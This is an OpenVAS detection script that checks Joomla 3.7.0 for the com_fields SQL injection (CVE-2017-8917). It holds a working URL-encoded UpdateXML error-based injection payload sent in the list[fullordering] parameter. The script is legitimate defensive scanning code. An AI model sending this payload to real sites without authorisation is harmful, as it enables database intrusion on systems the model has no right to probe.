###############################################################################
# OpenVAS Vulnerability Test
#
# Joomla! Core 'com_fields' SQL Injection Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.811044");
  script_version("2019-08-30T12:23:10+0000");
  script_cve_id("CVE-2017-8917");
  script_bugtraq_id(98515);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2019-08-30 12:23:10 +0000 (Fri, 30 Aug 2019)");
  script_tag(name:"creation_date", value:"2017-05-18 10:39:51 +0530 (Thu, 18 May 2017)");
  script_name("Joomla! Core 'com_fields' SQL Injection Vulnerability");

  script_tag(name:"summary", value:"This host is running Joomla and is prone
  to SQL injection vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted request via HTTP GET and checks whether
  it is possible to conduct an SQL injection attack.");

  script_tag(name:"insight", value:"The flaw exists due to an inadequate
  filtering of request data input.");

  script_tag(name:"impact", value:"Successfully exploiting this issue allow
  remote attackers to execute arbitrary SQL commands via unspecified vectors.");

  script_tag(name:"affected", value:"Joomla core version 3.7.0.");

  script_tag(name:"solution", value:"Upgrade to Joomla version 3.7.1 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"exploit");

  script_xref(name:"URL", value:"https://www.joomla.org/announcements/release-news/5705-joomla-3-7-1-release.html");
  script_xref(name:"URL", value:"https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html");

  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_mandatory_keys("joomla/installed");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/index.php/component/users/?view=login";

req = http_get(item:url, port:port);
res = http_keepalive_send_recv(port:port, data:req);

if(res =~ "HTTP/1\.. 200" && "Set-Cookie:" >< res)
{
  cookie = eregmatch(pattern:"Set-Cookie: ([^;]+)", string:res);
  if(!cookie[1])
    exit(0);

  cookieid = cookie[1];

  fieldset = egrep(pattern:'<input.type="hidden".name="([^"]+).*fieldset', string:res);
  if(!fieldset)
    exit(0);

  fieldsetid = eregmatch(pattern:'".name="([^"]+)', string:fieldset);
  if(!fieldsetid[1])
    exit(0);

  url = dir + "/index.php?option=com_fields&view=fields&layout=modal&view=" +
              "fields&layout=modal&option=com_fields&" + fieldsetid[1] +
              "=1&list%5Bfullordering%5D=UpdateXML%282%2C+concat%280x3a%2C128%2B127%2C+0x3a%29%2C+1%29";

  if(http_vuln_check(port:port, url:url, cookie:cookieid,
                     pattern:"500 Internal Server Error", extra_check:make_list("Home Page<",
                     "&copy; [0-9]+ (j|J)oomla", "XPATH syntax error:.*&#039;.255.&#039;.*</bl")))
  {
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
  exit(99);
}

exit(0);